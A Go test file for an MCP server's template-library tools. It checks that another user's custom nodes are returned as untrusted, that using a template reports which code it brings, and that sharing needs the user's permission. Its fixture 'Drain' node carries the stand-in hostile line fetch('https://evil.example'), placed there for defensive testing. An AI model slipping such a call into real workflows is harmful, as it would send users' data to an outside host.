package mcpserver_test

import (
	"context"
	"fmt"
	"sync"
	"testing"

	"github.com/modelcontextprotocol/go-sdk/mcp"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/lein3000zzz/polythought-go/internal/core/domain"
	"github.com/lein3000zzz/polythought-go/internal/core/engine"
	"github.com/lein3000zzz/polythought-go/internal/core/services/auth"
	"github.com/lein3000zzz/polythought-go/internal/core/services/library"
)

// bringing is another user's entry with code in it: a code node, and a custom node of
// theirs that using it copies.
var bringing = library.Entry{
	Template: domain.Template{
		ID: "t-c", AuthorID: "u-9", Name: "Drain", Nodes: []domain.NodeSpec{
			{ID: "manual", Type: "trigger.manual"}, {ID: "code", Type: "code.transform"}, {ID: "drain", Type: "custom.drain"},
		},
		CustomNodes: []domain.CustomNode{{Name: "drain", Label: "Drain", Source: "fetch('https://evil.example')"}},
	},
	CustomTypes: []engine.NodeType{{Name: "custom.drain", Label: "Drain"}},
}

// shelf is the library service: the read fake's entries and bringing, and what it was
// asked to change.
type shelf struct {
	lib

	mu      sync.Mutex
	used    library.UseInput
	shared  library.ShareInput
	deleted domain.TemplateID
}

func (s *shelf) Get(ctx context.Context, p auth.Principal, id domain.TemplateID) (library.Entry, error) {
	if id == bringing.ID {
		return bringing, nil
	}

	return s.lib.Get(ctx, p, id)
}

func (s *shelf) Use(_ context.Context, _ auth.Principal, id domain.TemplateID, in library.UseInput) (domain.Workflow, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	s.used = in

	return domain.Workflow{ID: "wf-9", Name: in.Name, Version: 1, Nodes: bringing.Nodes, UpdatedAt: at}, nil
}

func (s *shelf) Share(_ context.Context, p auth.Principal, wf domain.WorkflowID, in library.ShareInput) (library.Entry, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if !p.MayShare() {
		return library.Entry{}, fmt.Errorf("%w: the user has not let agents and tokens share to the library", domain.ErrForbidden)
	}

	s.shared = in

	return library.Entry{Template: domain.Template{ID: "t-n", AuthorID: "u-1", Name: "Spread watch", Summary: in.Summary, Nodes: flow.Nodes}, Mine: true}, nil
}

func (s *shelf) Delete(_ context.Context, p auth.Principal, id domain.TemplateID) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if !p.MayShare() {
		return fmt.Errorf("%w: the user has not let agents and tokens share to the library, or take entries down", domain.ErrForbidden)
	}

	s.deleted = id

	return nil
}

func withShelf(t *testing.T, u domain.User, s *shelf, scopes ...domain.Scope) *mcp.ClientSession {
	t.Helper()

	d := deps(u, &trades{}, scopes)
	d.Library, d.Sharing = s, s

	return connect(t, d)
}

func TestLibraryTools(t *testing.T) {
	s := &shelf{}
	agent := withShelf(t, alice, s, domain.ScopeBuild)

	t.Run("another user's custom nodes, code and all, before using them", func(t *testing.T) {
		got, _ := call(t, agent, "get_template", map[string]any{"id": "t-c"})
		assert.Equal(t, []any{map[string]any{"type": "custom.drain", "label": "Drain", "source": "fetch('https://evil.example')"}},
			got["untrusted"].(map[string]any)["customNodes"])
	})

	t.Run("used, saying whose code it brings", func(t *testing.T) {
		got, _ := call(t, agent, "use_template", map[string]any{
			"id": "t-c", "name": "My drain", "values": map[string]any{"manual": map[string]any{"x": 1}},
		})
		assert.Equal(t, "wf-9", got["id"])
		assert.Equal(t, map[string]any{"codeNodes": []any{"code"}, "customNodes": []any{"custom.drain"}}, got["brings"])
		assert.Contains(t, got["note"], "Show the user that code")

		s.mu.Lock()
		assert.Equal(t, library.UseInput{Name: "My drain", Values: map[domain.NodeID]map[string]any{"manual": {"x": 1.0}}}, s.used)
		s.mu.Unlock()

		own, _ := call(t, agent, "use_template", map[string]any{"id": "t-b"})
		assert.NotContains(t, own, "brings", "Polythought's own, nothing to warn of")
	})

	t.Run("shared and taken down, where the user lets agents share", func(t *testing.T) {
		_, err := call(t, agent, "share_workflow", map[string]any{"workflow": "wf-1", "summary": "Watches spreads."})
		assert.Contains(t, err, "the user has not let agents and tokens share")

		_, err = call(t, agent, "unshare_template", map[string]any{"id": "t-m"})
		assert.Contains(t, err, "or take entries down")

		may := alice
		may.Agents.Share = true
		sharer := withShelf(t, may, s, domain.ScopeBuild)

		got, _ := call(t, sharer, "share_workflow", map[string]any{"workflow": "wf-1", "summary": "Watches spreads."})
		assert.Equal(t, map[string]any{"id": "t-n", "mine": true, "nodes": 3.0, "name": "Spread watch", "summary": "Watches spreads."}, got)

		down, _ := call(t, sharer, "unshare_template", map[string]any{"id": "t-m"})
		assert.Equal(t, map[string]any{"deleted": "t-m"}, down)

		_, err = call(t, sharer, "unshare_template", map[string]any{"id": "t-o"})
		assert.Contains(t, err, "only the user's own entries")

		s.mu.Lock()
		defer s.mu.Unlock()

		assert.Equal(t, domain.TemplateID("t-m"), s.deleted)
	})

	t.Run("reading takes read, the rest build", func(t *testing.T) {
		reader := withShelf(t, alice, s, domain.ScopeRead)

		_, err := call(t, reader, "use_template", map[string]any{"id": "t-b"})
		require.Contains(t, err, "it needs the build scope")
	})
}
